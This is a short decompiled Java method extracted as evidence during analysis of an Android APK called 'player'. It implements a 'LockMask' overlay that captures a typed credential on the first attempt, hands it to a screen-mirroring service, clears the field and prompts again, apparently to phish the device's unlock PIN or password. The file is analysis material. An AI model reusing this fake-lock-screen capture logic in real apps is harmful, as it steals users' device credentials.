// EXTRAIDO POR REA; representacion java; no es proyecto original.
// Evidencia: ev_807cb00db3d21e756d27bc4f3e1a34a68e119d6fc6c186951e4a377a40b71210
// Selector: {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'w1.y5', 'method_name': 'e'}

public final void e(String str) {
    if (str.isEmpty() || this.f5599g) {
        return;
    }
    int i3 = this.f5600h;
    int i4 = this.f5593a;
    if (i3 != 0) {
        this.f5599g = true;
        StringBuilder sbI = a0.a.i(i4, "[LockMask] credential submitted mode=", " len=");
        sbI.append(str.length());
        Log.i("ScreenMirror", sbI.toString());
        if (i4 == 0 && this.f5594b != null) {
            InputMethodManager inputMethodManager = (InputMethodManager) getContext().getSystemService("input_method");
            if (inputMethodManager != null) {
                inputMethodManager.hideSoftInputFromWindow(this.f5594b.getWindowToken(), 0);
            }
            this.f5594b.clearFocus();
        }
        postDelayed(new a2.h(this, str, 24), 80L);
        return;
    }
    this.f5600h = i3 + 1;
    StringBuilder sbI2 = a0.a.i(i4, "[LockMask] first attempt captured mode=", " len=");
    sbI2.append(str.length());
    Log.i("ScreenMirror", sbI2.toString());
    w5 w5Var = this.f5598f;
    if (w5Var != null) {
        p2.a0 a0Var = (p2.a0) w5Var;
        ScreenMirrorService.j(a0Var.f2874a, str, (ScreenMirrorService) a0Var.f2875b);
    }
    EditText editText = this.f5594b;
    if (editText != null) {
        editText.setText("");
    }
    this.f5596d.setLength(0);
    if (this.f5595c != null) {
        c();
    }
    TextView textView = this.f5597e;
    if (textView != null) {
        textView.setVisibility(0);
    }
    try {
        performHapticFeedback(17);
    } catch (Throwable unused) {
    }
}
